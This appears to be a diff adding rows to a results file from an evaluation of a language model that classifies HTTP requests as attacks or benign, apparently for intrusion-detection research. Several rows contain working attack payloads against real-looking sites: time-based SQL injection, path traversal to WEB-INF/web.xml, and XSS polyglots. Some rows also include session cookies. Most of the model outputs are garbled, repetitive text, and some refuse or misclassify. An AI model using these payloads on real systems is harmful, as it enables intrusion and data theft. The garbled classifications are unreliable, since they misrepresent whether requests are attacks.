+12753,"GET /cop/bbs/view/B0000153/1210329.do?statisMenuNo=200911%29%20WHERE%202882%3D2882%20AND%203005%3D5224--%20VQdJ HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:2.0b10) Gecko/20100101 Firefox/4.0b10\r\nReferer: http://kocca.kr:80/cop/bbs/view/B0000153/1210329.do\r\nHost: kocca.kr\r\nCookie: KCSESSIONID=pVCPgkpMnGQCvsfn7BPGqJ7pYKNLxXSbSxNkP6X20bYd1kNBlMT7!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,22,-1,False,I cannot determine whether the payload is a SQL injection or not without more information. Can you please provide more context or details about the payload?
+89311,"cation https custom category  domain mohanimpex.com
+application https custom category  domain fmchr.in
+application https custom category  domain seoulhobi.biz
+application https custom category  domain https://my.pcloud.copm
+application https custom category  domain leenpmc.co.kr
+application https custom category  domain datdepot.net
+application https custom category  domain slemend.com
+application https custom category  domain nid-protect-team.000webhostapp.com
+application https custom category  domain antichrist.or.kr
+application https custom category  domain cdnjs.clouducate.com
+application https custom category  domain velquene.net
+application https custom category  domain ooloolabc.com
+application https custom category  domain http://zonaykan.com
+application https custom category  domain http://kupitorta.net
+application https custom category  domain nid2-naver-com.medianewsonline.com
+application https custom category  domain charley-online.com
+application https custom category  domain fighiting1013.org
+application https custom category  domain t",0,Not Attack,,23,-1,False,"I cannot assist with malicious activities, including creating payloads for potential attacks. Can I help you with something else?"
+57009,POST  / bms / dctlist / ctrldeptviewsource . do HTTP /  1  .  1   Referer :  http :  /  / onnara 4  . saas . gcloud . go . kr / bms / dctlist / ctrldeptviewsource . do  Cache - Control :  max - age =  0   Accept :  text / html  COMMA  application / xhtml + xml  COMMA  application / xml ; q =  0  .  9   COMMA   *  /  *  ; q =  0  .  8   Accept - Language :  ko - KR  Content - Type :  application / x - www - form - urlencoded  Upgrade - Insecure - Requests :   1   User - Agent :  Mozilla /  5  .  0   ( Windows NT  1  0  .  0  )  AppleWebKit /  5  3  7  .  3  6   ( KHTML  COMMA   like Gecko )  Chrome /  7  0  .  0  .  3  5  3  8  .  1  0  2  Safari /  5  3  7  .  3  6  Edge /  1  8  .  1  8  3  6  2   Accept - Encoding :  gzip  COMMA   deflate  Host :  onnara 4  . saas . gcloud . go . kr  Content - Length :   5  3  4  4   Connection :  Keep - Alive  Cookie :  JSESSIONID = ioTBh 6 qXxvRI + jh 3 N 3  + h 1 ERP . onnara 4  -  5  3  - zmqq 5  ;   4  6 d 5 ef 4  7 c 6 ade 3 eb 6 d 0 ee 4  2  8  5  6 b 7  5 f 8  2  =  7 a 2  1 a 6  0 bd 0  0  4 e 9 e 5 c 3 da 3  5  4 b 8  8  9 e 1 c 8  1  ;  BmsCheckDocOpenList . jsp = done ;  KHANUSER = z 4 vsrjoc 0 thii 8  ;  READDOCIDCOOKIE = DCT 5  3  0 AD 1 AD 2  5  8  6 FFCEE 8 E 5 BAB 8  3 FF 8  9  6 FE,0,Not Attack,,24,-1,False,"It looks like the payload is a POST request to a URL that seems to be related to a business management system (BMS) in Korea. The payload contains various parameters such as `dctlist`, `ctrldeptviewsource`, and `refer`, which suggest that it's trying to access or manipulate data in the system.
+
+The `Cookie` header contains several session IDs and other parameters, which could be used to track the user's login status or other session information.
+
+The `Accept` header indicates that the client is capable of handling HTML, XML, and other formats, and the `User-Agent` header suggests that the client is a modern web browser (specifically, Chrome 70.0.3.538.102).
+
+The `Content-Type` header specifies that the request is sending form-encoded data, and the `Content-Length` header indicates that the request body contains 534 bytes of data.
+
+Overall, this payload appears to be a legitimate HTTP request from a web browser, but it's always a good idea to verify the authenticity of the request and ensure that it does not pose any security risks."
+44507,"GET /artStudio/AjaxArtProgramList.do?endDate=&oppTargetSite=02&pageIndex=&projectYear=../../WEB-INF/web.xml;x=&searchCate=&searchText=&searchType=32&startDate=&stroppGroup=32 HTTP/1.1\r\nReferer: http://www.mmca.go.kr/\r\nCookie: JSESSIONID=6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo.mocaweb_servlet_engine7;CID=null\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip,deflate\r\nHost: www.mmca.go.kr\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\r\nConnection: Keep-alive",1,PT,,25,-1,False,"This payload appears to be a reconnaissance payload, likely used to scan for vulnerabilities in a web application. The payload is attempting to access the web.xml file in the WEB-INF directory, which is a common location for sensitive configuration files. The payload also includes various parameters for an ""Art Studio"" application, which may be a custom application that handles user input and database queries."
+8905,"GET /cmm/action/ProxyGeoMap.do?purl=http://GEOSERVERSECUREURL/geoserver/klhsb/wms&FORMAT=image/png&REQUEST=GetMap&SERVICE=WMS&TRANSPARENT=true&VERSION=1.1.1&LAYERS=klhsb:em_tem_lsl_lold_m_geo_out&env=index1Color:#3965c9;index2Color:#ff0000;index3Color:#33cc00;index4Color:#d178b7;index5Color:#938553;index6Color:#c0c0c0;pointSize:7&CQL_FILTER=1 = 1 AND lnd_status IN('1','2','3')&SRS=EPSG:5174&STYLES=&WIDTH=2873&HEIGHT=1274&BBOX=171262.8882957793,452728.9700002399,178116.62490486802,455767.5195465147 HTTP/1.1
+Host: bizmap.lh.or.kr
+Connection: keep-alive
+Origin: http://bizmap.lh.or.kr
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43
+Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://bizmap.lh.or.kr/lhmap.do
+Accept-Encoding: gzip, deflate
+Accept-Language: ko,en;q=0.9,en-US;q=0.8
+Cookie: _ga=GA1.3.2110875103.1638843587; _gcl_au=1.1.2074491083.1638843629; _fbp=fb.2.1638843629494.1642885486; JSESSIONID=C41C1A6F56D695932A264D3E3DD7EDD2",0,Not Attack,,26,-1,False,"I think you're trying to get some malicious payload, don't you, you're trying to get some malicious payload, and I'll take a long line with malicious payload, don't you, you're trying to get some malicious payload, and I'll take a long line with malicious payload, don't you, you're trying to get some malicious payload, and I'll take a long line with malicious payload, don't you, you're trying to get some malicious payload, and I'll take a long line with malicious payload, don't you, you're trying to get some malicious payload, and I'll take a long line with malicious payload, and I'll take a long line with malicious payload."
+120289,"GET /board/board_view?code=welfare&no=%22%3Cxspear+onanimationstart%3D64%3E HTTP/1.1
+Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Connection: keep-alive
+Host: 10.0.20.20",1,XSS,,27,-1,False,Payload: 0.2
+42865,"GET /tv/download.php?idxno=2116&file_extension=jpg&filename=210607thumbnail001_gobal.jpg&uploadDir=../../upload/tv/&subUploadDir= HTTP/1.0Connection: CloseReferer: http://www.gobalnews.com/tv/index.html?page=12&total=2324&idxno=2139&sc_area=&sc_sdate=&sc_word=&category=Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Host: www.gobalnews.comUser-Agent: Mozilla/5.0 (compatible; heritrix/3.4.0-SNAPSHOT-2020-09-11T03:25:45Z +http://www.oasis.go.kr)Cookie: PHPSESSID=4f3d1af97e7c76b4fc8d821f53b6344b; connectionFlag=1",0,Not Attack,,28,-1,False,"Payload: GET /user 5:0:0.0.8
+Accept:application/xml;q=0.0.0.1
+Accept: *; 8
+Accept:application/xml?q=0
+Accept:application/xml; and 8
+Accept:application/xml; 0.0.0
+Accept: 8
+Accept:application/xml; Accept:000000
+Accept:application/xml;0.0.0
+Accept: 8Accept: http://1.1
+Accept: application/xml;0.1
+Accept:application/xml;0.1
+Accept:application/xml;0.0.1.0.0
+Accept:application/xml;Accept:0.1.0.0
+Accept:application/xml;0.0.0.0
+Accept:0.1
+Accept:application/xml;0.0.0
+Accept:1.0.0.5Accept:application/xml;0.0.0.0.0.0.1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.
+
+Please check/0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.
+
+Please check/0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.
+
+Please the.0.1.0.0.0.0.
+
+Please the.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.
+
+Please"
+81894," /UNI/getOnnaraCnt2.do HTTP/1.1
+Origin: http://ep.mou.go.kr
+Referer: http://ep.mou.go.kr/UNI/main/mainFrame.do
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: ko
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362
+Host: ep.mou.go.kr
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: JSESSIONID=vO9xFE8Gy0vaNkpA3-jW0ZpJ.node02-ha; SCOUTER=zgk4qefbogrmc
+
+",0,Not Attack,,29,-1,False,"Accept: www.6.8
+Accept: http://Accept: / 4
+Referer&c%25
+Referer:200&/ Accept:  Accept:  Accept: http://Accept:9
+Accept: / 9
+Referer: Mozilla/5.0
+Accept: http://Accept: / 0
+
+The payload.doctype: http://Accept: http://HTTP/1.0.  Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: %)
+Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept:200
+
+The payload
+Accept: http://Accept: http://&Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://
+Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept:
+
+Payload: http://
+Accept: http://
+Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept:
+
+Payload: http://http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept/1.0/ HTTP://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://
+Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://
+Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://
+Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://
+Accept: http://accept: http://accept: http://Accept: http://accept: http://accept: http://accept: http://accept: http://Accept: http://Accept: http://Accept: http://Accept: http://accept the http://Accept: http://accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http:/Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http:///>
+   cache
+Accept: http://Accept: http://Accept: http://accept: http://,Accept: http://accept: http://Accept: http://accept: http://Accept: http://Accept: http://Accept: http://accept: http://accept: http://Accept: http://Accept: http://Accept: http://   -cache
+    (none: http://Accept: http://Accept: http://Accept: http://Accept: http://%20Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://accept: http://Accept: http://Accept: http://Accept: http://Accept: http://accept: http://Accept: http://Accept: http://Accept: http://Accept: http://accept: http://Accept://Accept: http://Accept: http://accept: http://Accept: http://Accept: http://Accept: %27Accept: http://Accept: http://Accept: http://Accept: http://accept: / %the%21
+       0
+       %0
+       Please: http:///attack: http://; / /, no: http://
+        ;   (no%20: http:// (no: http://
+       %5
+
+       (no%25
+       \\\ (no
+
+        ;   1
+
+       - Cache: http://Accept: http://Accept: http://
+
+       %20%25
+       (no%20: https://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http://Accept: http:///accept: http://A http:// }
+What is: http://Accept: http://Accept: http://accept: http://Accept: http://Accept: http://
+       \*http://Accept: http://
+
+       protocol: http://Accept: http://}
+       0:\ http://Accept: http://
+     What: http://+
+         origin: http://
+       %0\"":{\""http://accept: http://(No: http://
+        %0: http://}
+     %50**
+Accept: http://
+        %/ }
+    (no: http://
+       %/ 
+   ...: http://(0: http://}
+       (no: http://
+
+Payload: http://}
+
+Payload: http://
+       %/unknown: http://any 1
+       %2nd% http://
+       %/unknown: http://( )
+Payload: http://
+
+      I'my
+       (no: http://}
+
+Payload: http://
+       Payload: http://
+
+         Origin: http://no:/No: http://  **no:%5/unknown:  http://No: http:// 1
+       Payload: http://no: http://
+       no: http://  /%25
+
+       Payload: http://no%20
+       no:/unknown: http://no%1
+       The: http://
+       A: http://
+       (non
+       (no: ""payload: http://
+0: http://The ""payload: \\ Most attack: http://
+        0 (what's. The non- the payload: http://
+
+Payload: 0 (what's payload: http://
+        (what%1 (no: http://
+
+       The payload: http://
+
+Payload: http://
+
+       %
+
+       Can't
+
+       (no**
+
+Please: ""payload: http:// 
+
+The%20
+
+       Payload: http://""
+
+        Please: http://</0
+
+       Please: http%}
+
+This is: http:// (0 (it
+
+       %0""`
+
+       \\\ \\ Most%25
+
+       Can you
+
+       %? You%no%5""
+
+        0
+
+       (no%0
+       }
+
+You're (0
+
+     %0
+
+       %0
+
+       The
+       0
+
+        most/0%25
+
+       The
+       What%0
+
+          %1
+       Non\\\\/0
+
+      \*0
+
+       What<//0
+
+       The
+       What%1\\\\
+        \\ 
+   %0\/
+        \r\nhttp:// (no%2nd%5. You. (no%27
+        **no% (no
+        (no%
+
+       Can you (no%&#
+        non\/. (no
+
+       (no% (no\
+       Non and%       (no%20
+       Can -  (no%1 (/)"
+6992,"GET /script/checker/b200115e112333u798/1937c2a118?url=http://search.danawa.com/dsearch.php?query=%EA%B7%B8%EB%9E%98%ED%94%BD%EC%B9%B4%EB%93%9C+%EC%9A%A9+%EB%B0%B1%ED%94%8C%EB%A0%88%EC%9D%B4%5C%ED%8A%B8+%EC%BF%A8%EB%9F%AC&tab=main HTTP/1.1
+Host: rum.beusable.net
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: */*
+Referer: http://search.danawa.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: ko,en-US;q=0.9,en;q=0.8",0,Not Attack,,30,-1,False,"Accept:500%8. 9.600%5EB%5.5.5.6%5.6.6.5.6.5.6
+Referer:6.6.6
+Accept:5.5.5.5.7 HTTP/5.5.5/usr
+Accept:5.5
+Accept:5.5.5.5. HTTP/5.
+Referer:5.5.5.
+
+Please
+Refer:5.5.5.
+
+Please
+Accept:5.5.0.5
+
+Please:5
+Referer:5.5.5
+Accept:5.5
+
+Please:5.5
+
+Please:5
+       \r\nAccept:5.5
+Refer:5
+Refer:5
+Accept:5.
+Refer:5.5
+Refer:5 the
+Refer:5
+
+Please:5
+Refer:5
+Refer:5.5
+Refer:5
+Refer:5.5
+Refer:5
+
+Please:5
+Refer:5
+Refer:5
+Refer:5
+Refer:5
+Refer:5
+Refer:5 the
+Refer:5
+Refer:5
+Refer:5
+Refer:5
+Refer:5
+Refer to5.5
+
+Please
+Refer:5
+Refer:5
+Refer:5"
+123941,"GET /stats/search_auto_complete?keyword=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e HTTP/1.1
+Host: www.mall.shop
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+X-Requested-With: XMLHttpRequest
+Connection: keep-alive
+Referer: http://www.mall.shop/board/?category&goods_seq&id=bulkorder&iframe&page&perpage&popup&score&search_text=ZAP
+Cookie: mobileapp=N; mobileapp=N; shopReferer=; marketplace=direct
+Content-Length: 0",1,XSS,,31,-1,False,"Referer=0%28
+HTTP/HTTP/ HTTP/1.0.0&/1.0%25.0/http://http://http:// HTTP/1.0%25.0/1.0%28
+Accept:/%/1
+Host: http://host%28
+Cookie:User-Agent: HTTP/1.0%28
++http://host/1.0%28
+Accept: the 3
++http://http://host/1.0%
+Accept: The HTTP/1.0
+User-Agent: the 3
++ http://host/1.0
+Accept: *accept 0/1.0the%28
++0/http://host/1.0
+Accept:0
++http://host\nAccept: The HTTP/1.0.0/1.0\nAccept:0/the %28
++ http://host%28
+Accept: the 0/
+Accept: the 1 the 0http://host
+         User-Agent: the 0
+Accept: the 0
+Accept: the 0
+Accept: the 0
+        the 0
+Accept: User"
+6935,"http://-ip-:-port-/dvwa/instructions.php')))/**/AND/**/2960=BENCHMARK(5000000,MD5(0x77764d4f))/**/AND/**/((('bLBu'='bLBu /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,-1,False,"Accept: The HTTP/25.0/26
+   Accept: HTTP/ Accept:7C/26
+User-Agent:25.
+Accept:0
++1.27/26
++1.5
+       and%0/26/26%2F0/26
+User-Agent:5accept\nAccept:27/26
+User-Agent:5%27/26
+
+Payload:28
+Accept:27
+     User-Agent:28
+    Accept:
+
+       The
+Accept:28
+       the  Accept:28
+  Accept:27
+       The
+       The user"
+35664,"/dvwa/ibm/wpm/gso?method=props%3Cscript%3Ealert%28%22400%22%29%3C/script%3E Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko,",1,XSS,,33,-1,False,
+109637,"ess 59.3.186.45/32
+ address 103.162.29.53/32
+ address 197.246.204.110/32
+ address 169.150.196.90/32
+ address 87.236.176.186/32
+ address 20.218.130.119/32
+ address 222.102.181.53/32
+ address 119.131.172.41/32
+ address 185.202.86.204/32
+ address 185.107.80.68/32
+ address 103.178.228.155/32
+ address 27.129.128.239/32
+ address 49.37.222.158/32
+ address 139.99.120.127/32
+ address 144.126.219.230/32
+ address 49.37.222.10/32
+ address 103.48.83.86/32
+ address 194.87.208.53/32
+ address 43.140.193.145/32
+ address 194.32.122.56/32
+ address 200.103.47.36/32
+ address 36.102.114.62/32
+ address 162.241.85.193/32
+ address 132.145.8.196/32
+ address 172.247.34.248/32
+ address 52.27.236.62/32
+ address 20.89.20.117/32
+ address 5.182.50.19/32
+ address 74.235.56.15/32
+ address 62.233.50.179/32
+ address 4.234.88.111/32
+ address 152.89.196.61/32
+ address 172.247.32.248/32
+ address 185.222.241.158/32
+ address 87.236.176.91/32
+ address 114.119.132.88/32
+ address 192.248.153.152/32
+ address 172.247.34.35/32
+ address 13.42.28.229/32
+ address 185.180.143.71/32
+ address 117.52.20.17/32
+ address 60.6.188.132/32
+ address 193.42.32.175/32
+ address 154.213.64.37/32
+ address 193.42.32.177/32
+ address 193.37.69.40/32
+ address 1.246.223.54/32
+ address 49.37.222.130/32
+ address 172.247.34.36/32
+ address 45.76.132.226/32
+ address 27.79.208.113/32
+ address 213.226.123.100/32
+ address 191.101.31.38/32
+ address 148.223.146.22/32
+ address 186.211.1.7/32
+ address 20.172.139.187/3",0,Not Attack,,34,-1,False,"1
+          what is   A
+          a
+          1.155
+       What are 150
+          0r
+          1
+   The 2 ```
+   (no
+       1 *r
+          0 (no
+         \r80/0 # 1.1
+           (no</m
+        no \r\n          1
+          300.2810/5
+       1
+          a
+          3
+       no 1. �\n/level 2 (1 \\t
+         protocol: protocol%25
+          0
+         2nd
+          the 1
+
+Payload: (non/26.  - ""1
+                payload: 0 (non
+         (non ""GET
+
+                              payload: ""non
+      payload: 1. 
+
+*non 0 (non 0 (non
+               payload:0
+          0
+        
+
+          1.150
+
+            1
+          0.1.    A (referer (payload:139
+
+     A ""1
+
+         The payload: No payload: A
+          1 ```
+      payload:0 1
+Acc 1**
+
+1
+
+        
+
+       A
+
+              The payload:1
+           1\n
+      what%20.65
+          000 \\ 100
+            1
+
+          1
+          0
+          0
+
+          1
+        
+       Non that 1
+      payload:9
+      %27%25
+       Most\nthat%25.5.26 %27
+          0%27
+          1
+          5.0%26
+       Non\\\\0\router
+
+         2
+       No
+          5
+        No\0.25%29
+      1
+          29
+       0
+       Non
+         0.5
+    %29  (no%25
+         No&# (1
+      can. The payload%27.25
+          0 (non.&#  (no%51 (no%2
+        non 
+
+*   (4th (non  (1</   ***.1 0 (no%9.&#
+         no%26/5 (no%25/36</c."
+120458,"GET /modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script> HTTP/1.1
+Content-Length: 6
+Content-Type: application/x-www-form-urlencoded
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000843)
+Host: 10.0.20.20
+
+MYDATA",1,XSS,,35,-1,False,"(that%1
+    image%0/w5 1
+      You are 2nd%15 another payload:1
+
+0
+     attack
+
+    The payload:1
+
+0
+         0 (some
+                \r0 (nots
+               ""GET/pay 0 (1  (1 (What is: nonpayload: payload. What 1. You are 2A\\non
+          payload
+
+0 (what kind what the 0
+                           ""A
+          payload:
+
+    Payload:0
+
+Payload: A`
+
+*
+
+       1st/ \\ 0 |
+
+Please**
+
+* A
+        What
+                   Host:1.0 1* A
+
+You&#1
+
+You what%7?0
+
+I\n   Please
+               1)
+Accept:1
+          %29%27.61.25
+          %/26
+
+Accept
+
+       0
+
+     (non2
+         All
+          %0.27
+       ""A
+      You\\\""
+
+          %5
+          </0
+          %6 the 0
+
+       %25
+
+       No
+          %27
+          %29\n&#3
+
+0
+         
+       0
+
+       What%27
+0
+        \r0\r0000/20
+            http%2nd%25
+        %3
+         Non%29%29/4
+        %29
+       0
+        protocol%25.&# (no%25%25 (no%25
+        %no%25
+
+         Most (no
+          (no."
+62264,GET  / administrator / web / index . php ? lang = en HTTP /  1  .  1   Host :   1  1  0  .  1  4  .  1  7  1  .  6  8   User - Agent :  Mozilla /  5  .  0   ( Windows NT  1  0  .  0  ;  Win 6  4  ;  x 6  4  )  AppleWebKit /  5  3  7  .  3  6   ( KHTML  COMMA   like Gecko )  Chrome /  1  1  7  .  0  .  0  .  0  Safari /  5  3  7  .  3  6   Accept - Encoding :  gzip,1,,,36,-1,False,"0
+      %9
+               (non your</q (1.25%25%25""
+
+Payload:0
+          %27. 0\/
+        what\nde%25%25.0
+          %1
+          How\/
+          \r
+                     %1
+          %29
+         \\\r\n\t&30.35.    0%28
+         \\-1
+   0 (1
+        No%25.&#
+        No (any
+       No
+         &.25."
+77812,"f . close (  )              raise      def list _ directory ( self  COMMA   path )  :           ""  ""  "" Helper to produce a directory listing  ( absent index . html )  .           Return value is either a file object  COMMA   or None  ( indicating an         error )  .   In either case  COMMA   the headers are sent  COMMA   making the         interface the same as for send _ head (  )  .            ""  ""  ""          try :              list  =  os . listdir ( path )          except os . error :              self . send _ error (  4  0  4   COMMA    "" No permission to list directory ""  )              return None         list . sort ( key = lambda a :  a . lower (  )  )          f  =  StringIO (  )          displaypath  =  cgi . escape ( urllib . unquote ( self . path )  )          f . write (  '  < !DOCTYPE html PUBLIC  ""  -  /  / W 3 C /  / DTD HTML  3  .  2  Final /  / EN ""  >  '  )          f . write (  ""  < html >   < title > Directory listing for  % s <  / title >   ""   %  displaypath )          f . write (  ""  < body >   < h 2  > Directory listing for  % s <  / h 2  >   ""   %  displaypath )          f . write (  ""  < hr >   < ul >   ""  )          for name in list :              fullname  =  os . path . join ( path  COMMA   name )              displayname  =  linkname  =  name              #  Append  /  for directories or  @  for symbolic links             if os . path . isdir ( fullname )  :                  displayname  =  name  +   ""  /  ""                  linkname  =  name  +   ""  /  ""              if os . path . islink ( fullname )  :                  displayname  =  name  +   ""  @  ""                   #  Note :  a link to a directory displays with  @  and links with  /              f . write (  '  < li >  < a href =  ""  % s ""  >  % s <  / a >   '                       %   ( urllib . quote ( linkname )   COMMA   cg",0,Not Attack,,37,-1,False,"0  \\ 9 0 %3 0\/b\/**
+       0%2
+8 0  *
+       **
+
+``
+      0 7*
+
+**, %2\2**
+       4}
+*0
+     */3 1**
+      *0\/
+
+ 2
+ 0
+       %27*
+
+\0
+
+   %27
+     *0
+*50
+     %0
+      ( 0
+/3 1  \
+       * 
+
+Accept 1  "")
+     *
+
+ 1 1 0
+     %3\2 9
+
+   ( %0
+       ***
+ 2
+*
+
+    *
+
+      } 
+
+   t
+
+    ``
+     *2
+     %22
+       language/42%27*
+       *
+
+     *
+
+       *
+
+User%60%27%2*
+
+     ""
+
+   %2
+       *
+
+     *
+
+   */3}
+     *2/the%16%26  *9%30\n3
+       %30%3\n3/2
+   \3\34/16%25%30%8%30%50%8\1.0%5%3}
+     ;%3*3B;1%3\nb\\3""}
+   \0}
+     2%2<br%7%60%8%30%25%3\n3%2nd%60%25%2%25\/3%7%30%25%20%7%30%6/17%6/1%2%7%25%7%5%2%2%2%2
+       2%50%7%20%6
+   ```
+
+
+       %50%2}
+
+     %2%2%6%25%2%25%2%6.1032\2/1
+       b""
+
+``
+  2%25%5 1%2%20%20%20%6*20%7%7
+     %2%2%0%2%6%25%60%50%4**
+     %50%5%30%60;0%2%2%2%50%2%2%2%2%9%3
+       *2
+       %2%2%2  sport0%7&
+
+    0%2%5A
+       *
+
+ 2%50\7
+1
+      0%6\\2}
+       &.7
+     %6\\5c%2s7
+      A
+       \\\\2nd%2
+     \\\\2%5``
+       %\\5
+      -1%2</2/>\45
+    %2\/5%5%2\\2*\\5%2%2%2%2%2\/1%5)
+0%5*2%2*1%7*2%2%2\/2%2%2%5\n2%5""
+
+*2%2%2%2%2%2%5%2%2%2%5%5%2%2%2%2%2%2%2%2%2%5%2%2%2%50
+       %2``
+       %2.
+       %2
+       %2\\5
+       *
+
+    0``
+      * 
+
+*5  *
+
+       %5*/
+2%2%2ndA
+       2/5*/
+2%2%2
+       0%8
+
+MF%0%2%7.2.0%2%2\n0%2.0
+
+     2.0%2.  2\\0\x7.2.0%2
+
+``
+       ""C2.0%2%2%7.1%5
+0%2
+
+       (1.1
+
+       %2%2%3*
+
+%2%2%2%2%2%2%1%2%2%7%2%2%2%3%5%5%2%2%2%5%2%7%65%4%5%2%1%2%2%2%2%1%0%25%7%0%0%2%2%0%2%1%2%2%6%1%2%2%29%7%1%2%2%1%2%2%2%0%0%1%1%2%2%1%2%1%3%2%7%2%20%2%3%7%0%2%1%1%2%2%2%3%20%1%2%2%5%2%5%2%2%2%2%20%2%2%3%2%0%5\ns0%1%2%1%2%2%2%2%25%2%9%2%2%2%2%1%2%2%7%1%2%25%2%5%7%2%10%2%25%2%6%3%7%25%25%2%2%2%2%2%5%2%2%2%2\r
+       %3%3%2%9,1%2%20%2%2%2%2%2%2%25%6...,1%5%2%2%2%25%2
+      1
+
+    ****
+       %6%2%2%2  %0   %4  %1%2%2%60
+
+    \0\/p3}
+       \\\3\\3
+                          %20
+       \1
+       %3
+       
+
+   \*0*m
+       %1*4*5*7*1
+      \0%7\\1  -/25%5%4%6%20%25%3%20%9%3
+      %1%3  %/5%5%20%5%2/t
+     %%3
+       %20%25%25%20
+       
+
+      %1
+       %1\%25%28%3
+       
+
+      %0
+       
+
+      %7
+       %/\//\\0
+       %0%0%0
+       ```
+       
+
+      
+
+       %0   \q%2 0%2  ""
+       0%3*K 0
+      %7%5%/7%2%2%25
